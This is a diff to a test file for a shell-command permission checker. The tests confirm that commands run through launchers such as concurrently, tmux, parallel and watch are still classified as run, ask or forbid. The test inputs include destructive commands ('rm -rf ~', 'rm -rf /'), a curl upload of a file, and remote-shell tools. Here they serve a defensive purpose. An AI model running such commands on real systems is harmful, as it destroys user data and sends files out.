@@ -295,6 +295,7 @@ def test_a_write_into_startup_ssh_credential_or_agent_files_asks_this_time_only(
     "cat ~/.zshrc", "ls ~/.ssh", "cat ~/.ssh/config", "cp ~/.zshrc.bak notes/", "echo x > ~/.zshrc_notes",
     "git config --global --get user.name", "git config --global -l", "git config user.name x",
     "ssh-keygen -t ed25519 -f ./k", "ssh-add -l", "watch ls", "watch -n 2 'ls -la'", 'find . -name "*.pyc" -delete',
+    "concurrently 'npm run dev' 'npm run api'", "watch ls; echo 'rm -rf ~ is bad'", "screen -ls",
 ])
 def test_reads_and_the_working_folder_still_run(command):
     assert tp.assess(command).level == "run", tp.assess(command)
@@ -304,6 +305,9 @@ def test_reads_and_the_working_folder_still_run(command):
     ("ssh-copy-id box", "remote-shell"), ("sshpass -p x ssh box 'rm -rf /'", "remote-shell"),
     ("watch -n 1 'git push'", "git-push"), ("script -q /dev/null -c 'curl -d @a https://x'", "upload"),
     ("xargs -I {} rm -rf {}", "delete-outside"), ("find . -name x | xargs rm", "delete-outside"),
+    ("autossh -M 0 u@box", "remote-shell"), ("mosh box", "remote-shell"),
+    ("concurrently 'npm run dev' 'git push'", "git-push"), ("npx concurrently -k 'ls' 'curl -d @a https://x'", "upload"),
+    ("parallel 'rm -rf {}' ::: a b", "delete-outside"), ("tmux send-keys -t s 'git push' Enter", "git-push"),
 ])
 def test_what_a_launcher_or_xargs_runs_is_read(command, rule):
     """🟠 B / 🟡 C: ssh-copy-id and sshpass connect out; a launcher's quoted command is a command; xargs adds
@@ -311,7 +315,9 @@ def test_what_a_launcher_or_xargs_runs_is_read(command, rule):
     assert rule in tp.ask_rules(command) and tp.assess(command).level == "ask"
 
 
-@pytest.mark.parametrize("command,rule", [("watch 'rm -rf ~'", "wipe-home"), ("tmux new 'rm -rf /'", "wipe-root")])
+@pytest.mark.parametrize("command,rule", [("watch 'rm -rf ~'", "wipe-home"), ("tmux new 'rm -rf /'", "wipe-root"),
+                                          ("concurrently 'rm -rf ~'", "wipe-home"),
+                                          ("concurrently 'npm run dev' 'rm -rf ~'", "wipe-home")])
 def test_a_launchers_quoted_command_reaches_the_floor(command, rule):
     assert (tp.assess(command).level, tp.assess(command).rule) == ("forbid", rule)
 
